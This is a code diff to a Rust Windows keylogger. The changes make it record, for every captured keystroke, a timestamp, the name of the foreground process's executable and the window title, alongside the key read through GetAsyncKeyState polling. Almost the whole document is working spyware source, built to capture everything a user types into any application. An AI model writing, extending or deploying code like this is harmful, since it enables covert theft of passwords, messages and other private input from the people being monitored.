@@ -11,15 +11,46 @@ use chrono::{DateTime, Utc, Timelike};
 
 #[cfg(windows)]
 fn run(file: &mut File) {
-    use winapi::um::winuser::{GetForegroundWindow, GetAsyncKeyState, GetWindowTextW, GetWindowTextLengthW};
+    use winapi::um::winuser::*;
     use winapi::ctypes::c_int;
+    use winapi::um::processthreadsapi::OpenProcess;
+    use winapi::um::psapi::GetProcessImageFileNameW;
+    use winapi::shared::minwindef::DWORD;
+    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
     use std::{thread, time::Duration};
 
     loop {
         thread::sleep(Duration::from_millis(10));
 
+        let hwnd = unsafe { GetForegroundWindow() };
+
+        let pid = unsafe {
+            let mut p = 0 as DWORD;
+            GetWindowThreadProcessId(hwnd, &mut p);
+            p
+        };
+
+        let handle = unsafe {
+            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
+        };
+
+        let filename = unsafe {
+            const LEN: i32 = 255;
+            let mut buf = vec![0 as u16; LEN as usize];
+            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN as u32);
+
+            //find the null terminator
+            let mut len = 0;
+            buf.iter().enumerate().for_each(|(i, c)| {
+                if *c == 0 && len == 0 {
+                    len = i;
+                }
+            });
+
+            String::from_utf16_lossy(buf[0..len].as_mut())
+        };
+
         let title = unsafe {
-            let hwnd = GetForegroundWindow();
             let len = GetWindowTextLengthW(hwnd) + 1;
             let mut t = String::from("__NO_TITLE__");
 
@@ -33,11 +64,15 @@ fn run(file: &mut File) {
             t
         };
 
+        let now: DateTime<Utc> = Utc::now();
+
         for i in 0 as c_int..255 as c_int {
             let key = unsafe { GetAsyncKeyState(i) };
 
             if (key & 1) > 0 {
-                let s = format!("[{}]-[{}]\n", title.trim(), keycode_to_string(i as u8));
+                let s = format!("[{}:{}:{:02}][{}][{}][{}]\n",
+                                now.hour(), now.minute(), now.second(),
+                                filename.trim(), title.trim(), keycode_to_string(i as u8));
 
                 #[cfg(debug_assertions)] {
                     print!("{}", s);
